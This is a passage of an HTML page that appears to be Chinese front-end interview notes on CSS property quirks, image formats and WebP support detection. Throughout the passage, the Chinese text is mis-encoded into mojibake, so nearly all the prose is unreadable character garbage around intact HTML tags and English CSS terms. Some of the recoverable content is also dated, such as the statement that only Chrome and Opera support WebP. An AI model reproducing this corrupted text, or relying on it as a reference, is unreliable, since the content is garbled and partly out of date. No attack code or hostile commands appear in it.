é«˜å®½æ¯”overflowå…ƒç´ é«˜å®½è¿˜è¦å¤§ï¼Œä¹Ÿéƒ½ä¸ä¼šå‡ºç°æ»šåŠ¨æ¡ã€‚</p><p>ï¼ˆ3ï¼‰overflowå…ƒç´ è‡ªèº«transformçš„æ—¶å€™ï¼ŒChromeå’ŒOperaæµè§ˆå™¨ä¸‹çš„overflowå‰ªè£æ˜¯æ— æ•ˆçš„ã€‚</p><h2 id="transition-å’Œ-animation-çš„åŒºåˆ«"><a href="#transition-å’Œ-animation-çš„åŒºåˆ«" class="headerlink" title="transition å’Œ animation çš„åŒºåˆ«"></a>transition å’Œ animation çš„åŒºåˆ«</h2><p>transitionå…³æ³¨çš„æ˜¯CSS propertyçš„å˜åŒ–ï¼Œpropertyå€¼å’Œæ—¶é—´çš„å…³ç³»æ˜¯ä¸€ä¸ªä¸‰æ¬¡è´å¡å°”æ›²çº¿ã€‚</p><p>animationä½œç”¨äºå…ƒç´ æœ¬èº«è€Œä¸æ˜¯æ ·å¼å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨å…³é”®å¸§çš„æ¦‚å¿µï¼Œåº”è¯¥è¯´å¯ä»¥å®ç°æ›´è‡ªç”±çš„åŠ¨ç”»æ•ˆæœã€‚</p><h2 id="pngã€jpgã€gif-è¿™äº›å›¾ç‰‡æ ¼å¼è§£é‡Šä¸€ä¸‹ï¼Œåˆ†åˆ«ä»€ä¹ˆæ—¶å€™ç”¨ã€‚æœ‰æ²¡æœ‰äº†è§£è¿‡-webpï¼Ÿ"><a href="#pngã€jpgã€gif-è¿™äº›å›¾ç‰‡æ ¼å¼è§£é‡Šä¸€ä¸‹ï¼Œåˆ†åˆ«ä»€ä¹ˆæ—¶å€™ç”¨ã€‚æœ‰æ²¡æœ‰äº†è§£è¿‡-webpï¼Ÿ" class="headerlink" title="pngã€jpgã€gif è¿™äº›å›¾ç‰‡æ ¼å¼è§£é‡Šä¸€ä¸‹ï¼Œåˆ†åˆ«ä»€ä¹ˆæ—¶å€™ç”¨ã€‚æœ‰æ²¡æœ‰äº†è§£è¿‡ webpï¼Ÿ"></a>pngã€jpgã€gif è¿™äº›å›¾ç‰‡æ ¼å¼è§£é‡Šä¸€ä¸‹ï¼Œåˆ†åˆ«ä»€ä¹ˆæ—¶å€™ç”¨ã€‚æœ‰æ²¡æœ‰äº†è§£è¿‡ webpï¼Ÿ</h2><p>ï¼ˆ1ï¼‰BMPï¼Œæ˜¯æ— æŸçš„ã€æ—¢æ”¯æŒç´¢å¼•è‰²ä¹Ÿæ”¯æŒç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚è¿™ç§å›¾ç‰‡æ ¼å¼å‡ ä¹æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå‹ç¼©ï¼Œæ‰€ä»¥BMPæ ¼å¼çš„å›¾ç‰‡é€šå¸¸å…·æœ‰è¾ƒå¤§çš„æ–‡ä»¶å¤§å°ã€‚</p><p>ï¼ˆ2ï¼‰GIFæ˜¯æ— æŸçš„ã€é‡‡ç”¨ç´¢å¼•è‰²çš„ã€ç‚¹é˜µå›¾ã€‚é‡‡ç”¨LZWå‹ç¼©ç®—æ³•è¿›è¡Œç¼–ç ã€‚æ–‡ä»¶å°ï¼Œæ˜¯GIFæ ¼å¼çš„ä¼˜ç‚¹ï¼ŒåŒæ—¶ï¼ŒGIFæ ¼å¼è¿˜å…·æœ‰æ”¯æŒåŠ¨ç”»ä»¥åŠé€æ˜çš„ä¼˜ç‚¹ã€‚ä½†GIFæ ¼å¼ä»…æ”¯æŒ8bitçš„ç´¢å¼•è‰²ï¼Œæ‰€ä»¥GIFæ ¼å¼é€‚ç”¨äºå¯¹è‰²å½©è¦æ±‚ä¸é«˜åŒæ—¶éœ€è¦æ–‡ä»¶ä½“ç§¯è¾ƒå°çš„åœºæ™¯ã€‚</p><p>ï¼ˆ3ï¼‰JPEGæ˜¯æœ‰æŸçš„ã€é‡‡ç”¨ç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚JPEGçš„å›¾ç‰‡çš„ä¼˜ç‚¹ï¼Œæ˜¯é‡‡ç”¨äº†ç›´æ¥è‰²ï¼Œå¾—ç›Šäºæ›´ä¸°å¯Œçš„è‰²å½©ï¼ŒJPEGéå¸¸é€‚åˆç”¨æ¥å­˜å‚¨ç…§ç‰‡ï¼Œä¸GIFç›¸æ¯”ï¼ŒJPEGä¸é€‚åˆç”¨æ¥å­˜å‚¨ä¼ä¸šLogoã€çº¿æ¡†ç±»çš„å›¾ã€‚å› ä¸ºæœ‰æŸå‹ç¼©ä¼šå¯¼è‡´å›¾ç‰‡æ¨¡ç³Šï¼Œè€Œç›´æ¥è‰²çš„é€‰ç”¨ï¼Œåˆä¼šå¯¼è‡´å›¾ç‰‡æ–‡ä»¶è¾ƒGIFæ›´å¤§ã€‚</p><p>ï¼ˆ4ï¼‰PNG-8æ˜¯æ— æŸçš„ã€ä½¿ç”¨ç´¢å¼•è‰²çš„ã€ç‚¹é˜µå›¾ã€‚PNGæ˜¯ä¸€ç§æ¯”è¾ƒæ–°çš„å›¾ç‰‡æ ¼å¼ï¼ŒPNG-8æ˜¯éå¸¸å¥½çš„GIFæ ¼å¼æ›¿ä»£è€…ï¼Œåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥å°½å¯èƒ½çš„ä½¿ç”¨PNG-8è€Œä¸æ˜¯GIFï¼Œå› ä¸ºåœ¨ç›¸åŒçš„å›¾ç‰‡æ•ˆæœä¸‹ï¼ŒPNG-8å…·æœ‰æ›´å°çš„æ–‡ä»¶ä½“ç§¯ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒPNG-8è¿˜æ”¯æŒé€æ˜åº¦çš„è°ƒèŠ‚ï¼Œè€ŒGIFå¹¶ä¸æ”¯æŒã€‚ç°åœ¨ï¼Œé™¤ééœ€è¦åŠ¨ç”»çš„æ”¯æŒï¼Œå¦åˆ™æˆ‘ä»¬æ²¡æœ‰ç†ç”±ä½¿ç”¨GIFè€Œä¸æ˜¯PNG-8ã€‚</p><p>ï¼ˆ5ï¼‰PNG-24æ˜¯æ— æŸçš„ã€ä½¿ç”¨ç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚PNG-24çš„ä¼˜ç‚¹åœ¨äºï¼Œå®ƒå‹ç¼©äº†å›¾ç‰‡çš„æ•°æ®ï¼Œä½¿å¾—åŒæ ·æ•ˆæœçš„å›¾ç‰‡ï¼ŒPNG-24æ ¼å¼çš„æ–‡ä»¶å¤§å°è¦æ¯”BMPå°å¾—å¤šã€‚å½“ç„¶ï¼ŒPNG24çš„å›¾ç‰‡è¿˜æ˜¯è¦æ¯”JPEGã€GIFã€PNG-8å¤§å¾—å¤šã€‚</p><p>ï¼ˆ6ï¼‰SVGæ˜¯æ— æŸçš„ã€çŸ¢é‡å›¾ã€‚SVGæ˜¯çŸ¢é‡å›¾ã€‚è¿™æ„å‘³ç€SVGå›¾ç‰‡ç”±ç›´çº¿å’Œæ›²çº¿ä»¥åŠç»˜åˆ¶å®ƒä»¬çš„æ–¹æ³•ç»„æˆã€‚å½“ä½ æ”¾å¤§ä¸€ä¸ªSVGå›¾ç‰‡çš„æ—¶å€™ï¼Œä½ çœ‹åˆ°çš„è¿˜æ˜¯çº¿å’Œæ›²çº¿ï¼Œè€Œä¸ä¼šå‡ºç°åƒç´ ç‚¹ã€‚è¿™æ„å‘³ç€SVGå›¾ç‰‡åœ¨æ”¾å¤§æ—¶ï¼Œä¸ä¼šå¤±çœŸï¼Œæ‰€ä»¥å®ƒéå¸¸é€‚åˆç”¨æ¥ç»˜åˆ¶ä¼ä¸šLogoã€Iconç­‰ã€‚</p><p>ï¼ˆ7ï¼‰WebPæ˜¯è°·æ­Œå¼€å‘çš„ä¸€ç§æ–°å›¾ç‰‡æ ¼å¼ï¼ŒWebPæ˜¯åŒæ—¶æ”¯æŒæœ‰æŸå’Œæ— æŸå‹ç¼©çš„ã€ä½¿ç”¨ç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚ä»åå­—å°±å¯ä»¥çœ‹å‡ºæ¥å®ƒæ˜¯ä¸ºWebè€Œç”Ÿçš„ï¼Œä»€ä¹ˆå«ä¸ºWebç”Ÿå‘¢ï¼Ÿå°±æ˜¯è¯´ç›¸åŒè´¨é‡çš„å›¾ç‰‡ï¼ŒWebPå…·æœ‰æ›´å°çš„æ–‡ä»¶ä½“ç§¯ã€‚ç°åœ¨ç½‘ç«™ä¸Šå……æ»¡äº†å¤§é‡çš„å›¾ç‰‡ï¼Œå¦‚æœèƒ½å¤Ÿé™ä½æ¯ä¸€ä¸ªå›¾ç‰‡çš„æ–‡ä»¶å¤§å°ï¼Œé‚£ä¹ˆå°†å¤§å¤§å‡å°‘æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®ä¼ è¾“é‡ï¼Œè¿›è€Œé™ä½è®¿é—®å»¶è¿Ÿï¼Œæå‡è®¿é—®ä½“éªŒã€‚</p><ul><li>åœ¨æ— æŸå‹ç¼©çš„æƒ…å†µä¸‹ï¼Œç›¸åŒè´¨é‡çš„WebPå›¾ç‰‡ï¼Œæ–‡ä»¶å¤§å°è¦æ¯”PNGå°26%ï¼›</li><li>åœ¨æœ‰æŸå‹ç¼©çš„æƒ…å†µä¸‹ï¼Œå…·æœ‰ç›¸åŒå›¾ç‰‡ç²¾åº¦çš„WebPå›¾ç‰‡ï¼Œæ–‡ä»¶å¤§å°è¦æ¯”JPEGå°25%~34%ï¼›</li><li>WebPå›¾ç‰‡æ ¼å¼æ”¯æŒå›¾ç‰‡é€æ˜åº¦ï¼Œä¸€ä¸ªæ— æŸå‹ç¼©çš„WebPå›¾ç‰‡ï¼Œå¦‚æœè¦æ”¯æŒé€æ˜åº¦åªéœ€è¦22%çš„æ ¼å¤–æ–‡ä»¶å¤§å°ã€‚</li></ul><p>ä½†æ˜¯ç›®å‰åªæœ‰Chromeæµè§ˆå™¨å’ŒOperaæµè§ˆå™¨æ”¯æŒWebPæ ¼å¼ï¼Œå…¼å®¹æ€§ä¸å¤ªå¥½ã€‚</p><h3 id="æµè§ˆå™¨å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ”¯æŒ-webp-æ ¼å¼å›¾ç‰‡"><a href="#æµè§ˆå™¨å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ”¯æŒ-webp-æ ¼å¼å›¾ç‰‡" class="headerlink" title="æµè§ˆå™¨å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ”¯æŒ webp æ ¼å¼å›¾ç‰‡"></a>æµè§ˆå™¨å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ”¯æŒ webp æ ¼å¼å›¾ç‰‡</h3><p>ï¼ˆ1ï¼‰å®½é«˜åˆ¤æ–­æ³•ã€‚é€šè¿‡åˆ›å»ºimageå¯¹è±¡ï¼Œå°†å…¶srcå±æ€§è®¾ç½®ä¸ºwebpæ ¼å¼çš„å›¾ç‰‡ï¼Œç„¶ååœ¨onloadäº‹ä»¶ä¸­è·å–å›¾ç‰‡çš„å®½é«˜ï¼Œå¦‚æœèƒ½å¤Ÿè·å–ï¼Œåˆ™è¯´æ˜æµè§ˆå™¨æ”¯æŒwebpæ ¼å¼å›¾ç‰‡ã€‚å¦‚æœä¸èƒ½è·å–æˆ–è€…è§¦å‘äº†onerrorå‡½æ•°ï¼Œé‚£ä¹ˆå°±è¯´æ˜æµè§ˆå™¨ä¸æ”¯æŒwebpæ ¼å¼çš„å›¾ç‰‡ã€‚</p><p>ï¼ˆ2ï¼‰canvasåˆ¤æ–­æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥åŠ¨æ€çš„åˆ›å»ºä¸€ä¸ªcanvaså¯¹è±¡ï¼Œé€šè¿‡canvasçš„toDataURLå°†è®¾ç½®ä¸ºwebpæ ¼å¼ï¼Œç„¶ååˆ¤æ–­è¿”å›å€¼ä¸­æ˜¯å¦å«æœ‰image/webpå­—æ®µï¼Œå¦‚æœåŒ…å«åˆ™è¯´æ˜æ”¯æŒWebPï¼Œåä¹‹åˆ™ä¸æ”¯æŒã€‚</p><h1 id="ç‰¹æ®Šæ€§"><a href="#ç‰¹æ®Šæ€§" class="headerlink" title="ç‰¹æ®Šæ€§"></a>ç‰¹æ®Šæ€§</h1><h2 id="border-çš„ç‰¹æ®Šæ€§ï¼Ÿ"><a href="#border-çš„ç‰¹æ®Šæ€§ï¼Ÿ" class="headerlink" title="border çš„ç‰¹æ®Šæ€§ï¼Ÿ"></a>border çš„ç‰¹æ®Šæ€§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰border-widthå´ä¸æ”¯æŒç™¾åˆ†æ¯”ã€‚</p><p>ï¼ˆ2ï¼‰border-styleçš„é»˜è®¤å€¼æ˜¯noneï¼Œæœ‰ä¸€éƒ¨åˆ†äººå¯èƒ½ä¼šè¯¯ä»¥ä¸ºæ˜¯solidã€‚è¿™ä¹Ÿæ˜¯å•çº¯è®¾ç½®border-widthæˆ–border-col<br>oræ²¡æœ‰è¾¹æ¡†æ˜¾ç¤ºçš„åŸå› ã€‚</p><p>ï¼ˆ3ï¼‰border-style:doubleçš„è¡¨ç°è§„åˆ™ï¼šåŒçº¿å®½åº¦æ°¸è¿œç›¸ç­‰ï¼Œä¸­é—´é—´éš”Â±1ã€‚</p><p>ï¼ˆ4ï¼‰border-coloré»˜è®¤é¢œè‰²å°±æ˜¯colorè‰²å€¼ã€‚</p><p>ï¼ˆ5ï¼‰é»˜è®¤backgroundèƒŒæ™¯å›¾ç‰‡æ˜¯ç›¸å¯¹äºpadding boxå®šä½çš„ã€‚</p><h2 id="line-height-çš„ç‰¹æ®Šæ€§ï¼Ÿ"><a href="#line-height-çš„ç‰¹æ®Šæ€§ï¼Ÿ" class="headerlink" title="line-height çš„ç‰¹æ®Šæ€§ï¼Ÿ"></a>line-height çš„ç‰¹æ®Šæ€§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å¯¹äºéæ›¿æ¢å…ƒç´ çš„çº¯å†…è”å…ƒç´ ï¼Œå…¶å¯è§†é«˜åº¦å®Œå…¨ç”±line-heightå†³å®šã€‚å¯¹äºæ–‡æœ¬è¿™æ ·çš„çº¯å†…è”å…ƒç´ ï¼Œline-heightå°±æ˜¯é«˜åº¦è®¡ç®—çš„åŸºçŸ³ï¼Œç”¨ä¸“ä¸šè¯´æ³•å°±æ˜¯æŒ‡å®šäº†ç”¨æ¥è®¡ç®—è¡Œæ¡†ç›’å­é«˜åº¦çš„åŸºç¡€é«˜åº¦ã€‚</p><p>ï¼ˆ2ï¼‰å†…è”å…ƒç´ çš„é«˜åº¦ç”±å›ºå®šé«˜åº¦å’Œä¸å›ºå®šé«˜åº¦ç»„æˆï¼Œè¿™ä¸ªä¸å›ºå®šçš„éƒ¨åˆ†å°±æ˜¯è¿™é‡Œçš„â€œè¡Œè·â€ã€‚æ¢å¥è¯è¯´ï¼Œline-heightä¹‹æ‰€ä»¥èµ·ä½œç”¨ï¼Œå°±æ˜¯é€šè¿‡æ”¹å˜â€œè¡Œè·â€æ¥å®ç°çš„ã€‚åœ¨CSSä¸­ï¼Œâ€œè¡Œè·â€åˆ†æ•£åœ¨å½“å‰æ–‡å­—çš„ä¸Šæ–¹å’Œä¸‹æ–¹ï¼Œä¹Ÿå°±æ˜¯å³ä½¿æ˜¯ç¬¬ä¸€è¡Œæ–‡å­—ï¼Œå…¶ä¸Šæ–¹ä¹Ÿæ˜¯æœ‰â€œè¡Œè·â€çš„ï¼Œåªä¸è¿‡è¿™ä¸ªâ€œè¡Œè·â€çš„é«˜åº¦ä»…ä»…æ˜¯å®Œæ•´â€œè¡Œè·â€é«˜åº¦çš„ä¸€åŠï¼Œå› æ­¤ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œåŠè¡Œè·â€ã€‚</p><p>ï¼ˆ3ï¼‰è¡Œè·=line-height-font-sizeã€‚</p><p>ï¼ˆ4ï¼‰borderä»¥åŠline-heightç­‰ä¼ ç»ŸCSSå±æ€§å¹¶æ²¡æœ‰å°æ•°åƒç´ çš„æ¦‚å¿µã€‚å¦‚æœæ ‡æ³¨çš„æ˜¯æ–‡å­—ä¸Šè¾¹è·ï¼Œåˆ™å‘ä¸‹å–æ•´ï¼›å¦‚æœæ˜¯æ–‡å­—ä¸‹è¾¹è·ï¼Œåˆ™å‘ä¸Šå–æ•´ã€‚</p><p>ï¼ˆ5ï¼‰å¯¹äºçº¯æ–‡æœ¬å…ƒç´ ï¼Œline-heightç›´æ¥å†³å®šäº†æœ€ç»ˆçš„é«˜åº¦ã€‚ä½†æ˜¯ï¼Œå¦‚æœåŒæ—¶æœ‰æ›¿æ¢å…ƒç´ ï¼Œåˆ™line-heightåªèƒ½å†³å®šæœ€å°é«˜åº¦ã€‚</p><p>ï¼ˆ6ï¼‰å¯¹äºå—çº§å…ƒç´ ï¼Œline-heightå¯¹å…¶æœ¬èº«æ˜¯æ²¡æœ‰ä»»ä½•ä½œç”¨çš„ï¼Œæˆ‘ä»¬å¹³æ—¶æ”¹å˜line-heightï¼Œå—çº§å…ƒç´ çš„é«˜åº¦è·Ÿç€å˜åŒ–å®é™…ä¸Šæ˜¯é€šè¿‡æ”¹å˜å—çº§å…ƒç´ é‡Œé¢å†…è”çº§åˆ«å…ƒç´ å æ®çš„é«˜åº¦å®ç°çš„ã€‚</p><p>ï¼ˆ7ï¼‰line-heightçš„é»˜è®¤å€¼æ˜¯normalï¼Œè¿˜æ”¯æŒæ•°å€¼ã€ç™¾åˆ†æ¯”å€¼ä»¥åŠé•¿åº¦å€¼ã€‚ä¸ºæ•°å€¼ç±»å‹æ—¶ï¼Œå…¶æœ€ç»ˆçš„è®¡ç®—å€¼æ˜¯å’Œå½“å‰font-sizeç›¸ä¹˜åçš„å€¼ã€‚ä¸ºç™¾åˆ†æ¯”å€¼æ—¶ï¼Œå…¶æœ€ç»ˆçš„è®¡ç®—å€¼æ˜¯å’Œå½“å‰font-sizeç›¸ä¹˜åçš„å€¼ã€‚ä¸ºé•¿åº¦å€¼æ—¶åŸæ„ä¸å˜ã€‚</p><p>ï¼ˆ8ï¼‰å¦‚æœä½¿ç”¨æ•°å€¼ä½œä¸ºline-heightçš„å±æ€§å€¼ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„å­å…ƒç´ ç»§æ‰¿çš„éƒ½æ˜¯è¿™ä¸ªå€¼ï¼›ä½†æ˜¯ï¼Œå¦‚æœä½¿ç”¨ç™¾åˆ†æ¯”å€¼æˆ–è€…é•¿åº¦å€¼ä½œä¸ºå±æ€§å€¼ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„å­å…ƒç´ ç»§æ‰¿çš„æ˜¯æœ€ç»ˆçš„è®¡ç®—å€¼ã€‚</p><p>ï¼ˆ9ï¼‰æ— è®ºå†…è”å…ƒç´ line-heightå¦‚ä½•è®¾ç½®ï¼Œæœ€ç»ˆçˆ¶çº§å…ƒç´ çš„é«˜åº¦éƒ½æ˜¯ç”±æ•°å€¼å¤§çš„é‚£ä¸ªline-heightå†³å®šçš„ã€‚</p><p>ï¼ˆ10ï¼‰åªè¦æœ‰â€œå†…è”ç›’å­â€åœ¨ï¼Œå°±ä¸€å®šä¼šæœ‰â€œè¡Œæ¡†ç›’å­â€ï¼Œå°±æ˜¯æ¯ä¸€è¡Œå†…è”å…ƒç´ å¤–é¢åŒ…è£¹çš„ä¸€å±‚çœ‹ä¸è§çš„ç›’å­ã€‚ç„¶åï¼Œé‡ç‚¹æ¥äº†ï¼Œåœ¨æ¯ä¸ªâ€œè¡Œæ¡†ç›’å­â€å‰é¢æœ‰ä¸€ä¸ªå®½åº¦ä¸º0çš„å…·æœ‰è¯¥å…ƒç´ çš„å­—ä½“å’Œè¡Œé«˜å±æ€§çš„çœ‹ä¸è§çš„â€œå¹½çµç©ºç™½èŠ‚ç‚¹â€ã€‚</p><h2 id="vertical-align-çš„ç‰¹æ®Šæ€§ï¼Ÿ"><a href="#vertical-align-çš„ç‰¹æ®Šæ€§ï¼Ÿ" class="headerlink" title="vertical-align çš„ç‰¹æ®Šæ€§ï¼Ÿ"></a>vertical-align çš„ç‰¹æ®Šæ€§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰vertical-alignçš„é»˜è®¤å€¼æ˜¯baselineï¼Œå³åŸºçº¿å¯¹é½ï¼Œè€ŒåŸºçº¿çš„å®šä¹‰æ˜¯å­—æ¯xçš„ä¸‹è¾¹ç¼˜ã€‚å› æ­¤ï¼Œå†…è”å…ƒç´ é»˜è®¤éƒ½æ˜¯æ²¿ç€å­—æ¯xçš„ä¸‹è¾¹ç¼˜å¯¹é½çš„ã€‚å¯¹äºå›¾ç‰‡ç­‰æ›¿æ¢å…ƒç´ ï¼Œå¾€å¾€ä½¿ç”¨å…ƒç´ æœ¬èº«çš„ä¸‹è¾¹ç¼˜ä½œä¸ºåŸºçº¿ã€‚ï¼šä¸€ä¸ªinline-blockå…ƒç´ ï¼Œå¦‚æœé‡Œé¢æ²¡æœ‰å†…è”å…ƒç´ ï¼Œæˆ–è€…overflowä¸æ˜¯visibleï¼Œåˆ™è¯¥å…ƒç´ çš„åŸºçº¿å°±æ˜¯å…¶marginåº•è¾¹ç¼˜ï¼›å¦åˆ™å…¶åŸºçº¿å°±æ˜¯å…ƒç´ é‡Œé¢æœ€åä¸€è¡Œå†…è”å…ƒç´ çš„åŸºçº¿ã€‚</p><p>ï¼ˆ2ï¼‰vertical-align:topå°±æ˜¯å‚ç›´ä¸Šè¾¹ç¼˜å¯¹é½ï¼Œå¦‚æœæ˜¯å†…è”å…ƒç´ ï¼Œåˆ™å’Œè¿™ä¸€è¡Œä½ç½®æœ€é«˜çš„å†…è”å…ƒç´ çš„é¡¶éƒ¨å¯¹é½ï¼›å¦‚æœdisplayè®¡ç®—å€¼æ˜¯table-cellçš„å…ƒç´ ï¼Œæˆ‘ä»¬ä¸å¦¨è„‘è¡¥æˆ<td>å…ƒç´ ï¼Œåˆ™å’Œ<tr>å…ƒç´ ä¸Šè¾¹ç¼˜å¯¹é½ã€‚</p><p>ï¼ˆ3ï¼‰vertical-align:middleæ˜¯ä¸­é—´å¯¹é½ï¼Œå¯¹äºå†…è”å…ƒç´ ï¼Œå…ƒç´ çš„å‚ç›´ä¸­å¿ƒç‚¹å’Œè¡Œæ¡†ç›’å­åŸºçº¿å¾€ä¸Š1/2x-heightå¤„å¯¹é½ã€‚å¯¹äºtable-cellå…ƒç´ ï¼Œå•å…ƒæ ¼å¡«å……ç›’å­ç›¸å¯¹äºå¤–é¢çš„è¡¨æ ¼è¡Œå±…ä¸­å¯¹é½ã€‚</p><p>ï¼ˆ4ï¼‰vertical-alignæ”¯æŒæ•°å€¼å±æ€§ï¼Œæ ¹æ®æ•°å€¼çš„ä¸åŒï¼Œç›¸å¯¹äºåŸºçº¿å¾€ä¸Šæˆ–å¾€ä¸‹åç§»ï¼Œå¦‚æœæ˜¯è´Ÿå€¼ï¼Œå¾€ä¸‹åç§»ï¼Œå¦‚æœæ˜¯æ­£å€¼ï¼Œå¾€ä¸Šåç§»ã€‚</p><p>ï¼ˆ5ï¼‰vertical-alignå±æ€§çš„ç™¾åˆ†æ¯”å€¼åˆ™æ˜¯ç›¸å¯¹äºline-heightçš„è®¡ç®—å€¼è®¡ç®—çš„ã€‚</p><p>ï¼ˆ6ï¼‰vertical-alignèµ·ä½œç”¨æ˜¯æœ‰å‰ææ¡ä»¶çš„ï¼Œè¿™ä¸ªå‰ææ¡ä»¶å°±æ˜¯ï¼šåªèƒ½åº”ç”¨äºå†…è”å…ƒç´ ä»¥åŠdisplayå€¼ä¸ºtable-cellçš„å…ƒç´ ã€‚</p><p>ï¼ˆ7ï¼‰table-cellå…ƒç´ è®¾ç½®vertical-alignå‚ç›´å¯¹é½çš„æ˜¯å­å…ƒç´ ï¼Œä½†æ˜¯å…¶ä½œç”¨çš„å¹¶ä¸æ˜¯å­å…ƒç´ ï¼Œè€Œæ˜¯table-cellå…ƒç´ è‡ªèº«ã€‚</p><h2 id="overflow-çš„ç‰¹æ®Šæ€§ï¼Ÿ"><a href="#overflow-çš„ç‰¹æ®Šæ€§ï¼Ÿ" class="headerlink" title="overflow çš„ç‰¹æ®Šæ€§ï¼Ÿ"></a>overflow çš„ç‰¹æ®Šæ€§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰ä¸€ä¸ªè®¾ç½®äº†overflow:hiddenå£°æ˜çš„å…ƒç´ ï¼Œå‡è®¾åŒæ—¶å­˜åœ¨borderå±æ€§å’Œpaddingå±æ€§ï¼Œåˆ™å½“å­å…ƒç´ å†…å®¹è¶…å‡ºå®¹å™¨å®½åº¦é«˜åº¦é™åˆ¶çš„æ—¶å€™ï¼Œå‰ªè£çš„è¾¹ç•Œæ˜¯border boxçš„å†…è¾¹ç¼˜ï¼Œè€Œépadding boxçš„å†…è¾¹ç¼˜ã€‚</p><p>ï¼ˆ2ï¼‰HTMLä¸­æœ‰ä¸¤ä¸ªæ ‡ç­¾æ˜¯é»˜è®¤å¯ä»¥äº§ç”Ÿæ»šåŠ¨æ¡çš„ï¼Œä¸€ä¸ªæ˜¯æ ¹å…ƒç´ <html>ï¼Œå¦ä¸€ä¸ªæ˜¯æ–‡æœ¬åŸŸ<textarea>ã€‚</p><p>ï¼ˆ3ï¼‰æ»šåŠ¨æ¡ä¼šå ç”¨å®¹å™¨çš„å¯ç”¨å®½åº¦æˆ–é«˜åº¦ã€‚</p><p>ï¼ˆ4ï¼‰å…ƒç´ è®¾ç½®äº†overflow:hiddenå£°æ˜ï¼Œé‡Œé¢å†…å®¹é«˜åº¦æº¢å‡ºçš„æ—¶å€™ï¼Œæ»šåŠ¨ä¾ç„¶å­˜åœ¨ï¼Œä»…ä»…æ»šåŠ¨æ¡ä¸å­˜åœ¨ï¼</p><h2 id="relative-çš„ç‰¹æ®Šæ€§ï¼Ÿ"><a href="#relative-çš„ç‰¹æ®Šæ€§ï¼Ÿ" class="headerlink" title="relative çš„ç‰¹æ®Šæ€§ï¼Ÿ"></a>relative çš„ç‰¹æ®Šæ€§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰ç›¸å¯¹å®šä½å…ƒç´ çš„left/top/right/bottomçš„ç™¾åˆ†æ¯”å€¼æ˜¯ç›¸å¯¹äºåŒ…å«å—è®¡ç®—çš„ï¼Œè€Œä¸æ˜¯è‡ªèº«ã€‚æ³¨æ„ï¼Œè™½ç„¶å®šä½ä½ç§»æ˜¯ç›¸å¯¹è‡ªèº«ï¼Œä½†æ˜¯ç™¾åˆ†æ¯”å€¼çš„è®¡ç®—å€¼ä¸æ˜¯ã€‚</p><p>ï¼ˆ2ï¼‰topå’Œbottomè¿™ä¸¤ä¸ªå‚ç›´æ–¹å‘çš„ç™¾åˆ†æ¯”å€¼è®¡ç®—è·Ÿheightçš„ç™¾åˆ†æ¯”å€¼æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ç›¸å¯¹é«˜åº¦è®¡ç®—çš„ã€‚åŒæ—¶ï¼Œå¦‚æœåŒ…å«å—çš„é«˜åº¦æ˜¯autoï¼Œé‚£ä¹ˆè®¡ç®—å€¼æ˜¯0ï¼Œåç§»æ— æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœçˆ¶å…ƒç´ æ²¡æœ‰è®¾å®šé«˜åº¦æˆ–è€…ä¸æ˜¯â€œæ ¼å¼åŒ–é«˜åº¦â€ï¼Œé‚£ä¹ˆrelativeç±»ä¼¼top:20%çš„ä»£ç ç­‰åŒäºtop:0ã€‚</p><p>ï¼ˆ3ï¼‰å½“ç›¸å¯¹å®šä½å…ƒç´ åŒæ—¶åº”ç”¨å¯¹ç«‹æ–¹å‘å®šä½å€¼çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯top/bottomå’Œleft/rightåŒæ—¶ä½¿ç”¨çš„æ—¶å€™ï¼Œåªæœ‰ä¸€ä¸ªæ–¹å‘çš„å®šä½å±æ€§ä¼šèµ·ä½œç”¨ã€‚è€Œè°èµ·ä½œç”¨åˆ™æ˜¯ä¸æ–‡æ¡£æµçš„é¡ºåºæœ‰å…³çš„ï¼Œé»˜è®¤çš„æ–‡æ¡£æµæ˜¯è‡ªä¸Šè€Œä¸‹ã€ä»å·¦å¾€å³ï¼Œå› æ­¤top/bottomåŒæ—¶ä½¿ç”¨çš„æ—¶å€™ï¼Œbottomå¤±æ•ˆï¼›left/rightåŒæ—¶ä½¿ç”¨çš„æ—¶å€™ï¼Œrightå¤±æ•ˆã€‚</p><h2 id="text-indent-çš„ç‰¹æ®Šæ€§ï¼Ÿ"><a href="#text-indent-çš„ç‰¹æ®Šæ€§ï¼Ÿ" class="headerlink" title="text-indent çš„ç‰¹æ®Šæ€§ï¼Ÿ"></a>text-indent çš„ç‰¹æ®Šæ€§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰text-indentä»…å¯¹ç¬¬ä¸€è¡Œå†…è”ç›’å­å†…å®¹æœ‰æ•ˆã€‚</p><p>ï¼ˆ2ï¼‰éæ›¿æ¢å…ƒç´ ä»¥å¤–çš„displayè®¡ç®—å€¼ä¸ºinlineçš„å†…è”å…ƒç´ è®¾ç½®text-indentå€¼æ— æ•ˆï¼Œå¦‚æœè®¡ç®—å€¼inline-block/inline-tableåˆ™ä¼šç”Ÿæ•ˆã€‚</p><p>ï¼ˆ3ï¼‰<input>æ ‡ç­¾æŒ‰é’®text-indentå€¼æ— æ•ˆã€‚</p><p>ï¼ˆ4ï¼‰<button>æ 